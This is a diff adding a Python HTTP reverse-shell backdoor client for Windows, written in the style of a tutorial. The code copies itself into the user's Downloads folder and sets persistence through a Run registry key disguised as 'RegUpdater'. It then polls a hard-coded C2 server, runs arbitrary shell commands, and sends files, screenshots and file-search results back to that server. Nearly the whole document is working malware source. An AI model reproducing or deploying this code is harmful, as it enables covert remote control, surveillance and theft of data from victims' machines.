@@ -1,0 +1,112 @@
+# HTTPReverseShellClient00.py
+# 2023-05-30
+
+import os
+import shutil
+import subprocess
+import sys
+import winreg as wreg
+import requests
+import time
+import random
+
+from PIL import ImageGrab # Used to Grab a screenshot
+import tempfile           # Used to Create a temp directory
+import shutil             # Used to Remove the temp directory
+
+
+# Reconn Phase
+path = os.getcwd().strip('/n')
+Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split(b'=')
+running_file = sys.argv[0].split('\\')[-1]
+destination = userprof.decode().strip('\n\r') + '\\Downloads\\' + running_file
+
+# If it's the first time the backdoor gets executed
+if not os.path.exists(destination):
+    shutil.copyfile(sys.argv[0], destination) # sys.argv[0] will return the file name
+    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
+    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
+    key.Close()
+
+
+# Last phase is to start a reverse connection back to the server machine
+URL_SERVER = 'http://192.168.1.53:7080'
+URL_FILE_TRANSFER = '/store'
+FILES_KEY = 'file'
+
+def connect():
+    while True:
+        req = requests.get(URL_SERVER)
+        command = req.text
+        
+        if 'terminate' in command:
+            return 1
+
+        elif 'grab' in command:
+            grab,path=command.split('*')
+            if os.path.exists(path):
+                url = URL_SERVER + URL_FILE_TRANSFER
+                files = {FILES_KEY: open(path, 'rb')}
+                r = requests.post(url, files=files)
+                files[FILES_KEY].close()
+            else:
+                post_response = requests.post(url=URL_SERVER, data='[ERROR] Not able to find the file.')
+
+        elif 'screencap' in command: # If it got a screencap keyword, then...
+            dirpath = tempfile.mkdtemp() # Create a temp dir to store our screenshot file
+            tempImage = dirpath + "image1.jpg"
+            ImageGrab.grab().save(tempImage, "JPEG")
+            url = URL_SERVER + URL_FILE_TRANSFER
+            files = {FILES_KEY: open(tempImage, 'rb')}
+            r = requests.post(url, files=files) # Transfer the file over our HTTP
+            files[FILES_KEY].close() # Once the file gets transferred, close the file
+            shutil.rmtree(dirpath) # Remove the entire temp dir
+
+        elif 'search' in command:  # The Formula is search <path>*.<file extension> , for example let's say that we got search C:\\*.pdf
+            # if we remove the first 7 character the output would C:\\*.pdf which is basically what we need
+
+            command = command[7:] # cut off the the first 7 character, output would be C:\\*.pdf
+            
+            path, ext = command.split('*') # split C:\\*.pdf into two sections, the first section (C:\\) will be stored in path variable and
+                                        # the second variable (.pdf) will be stored in ext variable
+            
+            list = '' # here we define a string where we will append our result on it
+            '''
+            os.walk is a function that will naviagate ALL the directoies specified in the provided path and returns three values:-
+
+                dirpath is a string contains the path to the directory
+                dirnames is a list of the names of the subdirectories in  dirpath
+                files is a list of the files name in dirpath
+
+                Once we got the files list, we check each file (using for loop), if the file extension was matching what we are looking for, then
+                we add the directory path into list string. the  os.path.join represents a path relative for our file to
+                the current directory and in our example it's the C:\\ directory
+            '''
+
+            for dirpath, dirname, files in os.walk(path):
+                for file in files:
+                    if file.endswith(ext):
+                        list = list + '\n' + os.path.join(dirpath, file)
+                        
+            requests.post(url=URL_SERVER, data=list) # Send the search result
+
+        elif 'cd' in command: # the formula here is gonna be cd then space then the path that we want to go to, like cd C:\Users
+            code, directory = command.split(' ') # split up the reiceved command based on space into two variables
+            os.chdir(directory) # changing the directory
+            requests.post(url=URL_SERVER, data="[OK] CWD is " + os.getcwd()) # we send back a string mentioning the new CWD
+
+        else:
+            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            post_response = requests.post(url=URL_SERVER, data=CMD.stdout.read())
+            post_response = requests.post(url=URL_SERVER, data=CMD.stderr.read())
+    time.sleep(3)
+
+
+while True:
+    try:
+        if connect() == 1:
+            break
+    except:
+        sleep_for = random.randrange(1,10)
+        time.sleep(sleep_for) # sleep for a random time between 1-10 minutes
+        pass
